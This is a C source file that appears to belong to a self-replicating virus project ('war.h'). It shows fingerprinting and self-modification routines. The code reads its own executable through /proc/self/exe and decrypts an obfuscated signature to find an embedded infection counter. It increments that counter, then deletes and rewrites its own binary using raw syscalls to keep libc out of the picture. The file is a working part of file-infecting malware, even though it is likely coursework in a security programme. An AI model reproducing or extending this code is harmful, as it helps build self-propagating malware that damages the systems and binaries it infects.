#include "war.h"

#define FNV_OFFSET_BASIS_64 0xcbf29ce484222325
#define FNV_PRIME_64 0x00000100000001b3

uint64_t fnv1a_64(const void *data, size_t len) {
	uint64_t hash = FNV_OFFSET_BASIS_64;
	for (size_t i = 0; i < len; i++) {
		hash ^= ((uint8_t *)data)[i];
		hash *= FNV_PRIME_64;
	}
	return hash;
}

void hash_to_printable(uint64_t hash, char *fingerprint) {
	for (size_t i = 0; i < 8; i++) {
		fingerprint[i] = (hash % 94) + 33;
		hash /= 94;
	}
}

void update_fingerprint(char *fingerprint, t_data *data) {
	uint64_t hash = fnv1a_64(data->self_name, ft_strlen(data->self_name));
	hash ^= fnv1a_64(data->target_name, ft_strlen(data->target_name));
	hash_to_printable(hash, fingerprint);
}

void increment_counter(char *counter) {
	for (int i = 3; i >= 0; i--) {
		if (counter[i] == '9') {
			counter[i] = '0';
		} else {
			counter[i] += 1;
			break;
		}
	}
}

int self_fingerprint(const char *self_name, size_t increment) {

	struct stat st;
	/* we could open the file with O_RDWR but text file is busy */
	int fd = _syscall(SYS_open, self_name, O_RDONLY);

	if (fd == -1) {
		return -1;
	}

	if (_syscall(SYS_fstat, fd, &st) == -1) {
		_syscall(SYS_close, fd);
		return -1;
	}

	/* we could use MAP_SHARED but we can't open the file with O_RDWR */
	uint8_t *self = (uint8_t *)_syscall(SYS_mmap, 0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
	if (self == MAP_FAILED) {
		_syscall(SYS_close, fd);
		return -1;
	}

	_syscall(SYS_close, fd);

	char signature[] = "\x45\x19\x39\x0b\xd0\x15\x52\xf0\x76\x19\x6a\x57\xda\x50\x58\xfa\x70\x18\x6a\x1d\xc0\x59\x6c\xfa\x7c\x0e\x25\x06\xdc\x0b\x6a\xbe\x33\x5c\x11\x1a\xd8\x14\x56\xec\x48";

	encrypt((uint8_t *)signature, sizeof(signature) - 1, DEFAULT_KEY);

	char *found = ft_memmem(self, st.st_size, signature, ft_strlen(signature));
	if (found == NULL) {
		_syscall(SYS_munmap, self, st.st_size);
		return -1;
	}

	char *counter = found + SIGNATURE_SIZE - 6;

	while (increment--) {
		increment_counter(counter);
	}

	if (_syscall(SYS_unlink, self_name) == -1) {
		_syscall(SYS_munmap, self, st.st_size);
		return -1;
	}

	fd = _syscall(SYS_open, self_name, O_CREAT | O_WRONLY | O_TRUNC, st.st_mode);
	if (fd == -1)
		return -1;

	if (_syscall(SYS_write, fd, self, st.st_size) == -1) {
		_syscall(SYS_close, fd);
		_syscall(SYS_munmap, self, st.st_size);
		return -1;
	}

	if (_syscall(SYS_munmap, self, st.st_size) == -1) {
		_syscall(SYS_close, fd);
		return -1;
	}

	_syscall(SYS_close, fd);

	return 0;
}

int self_name(char *self_name) {
	char buf[PATH_MAX];
	char proc_self_exe[] = "/proc/self/exe";

	int ret = _syscall(SYS_readlink, proc_self_exe, buf, PATH_MAX);
	if (ret == -1) {
		return -1;
	}
	buf[ret] = '\0';

	ft_strncpy(self_name, buf, PATH_MAX);

	return 0;
}
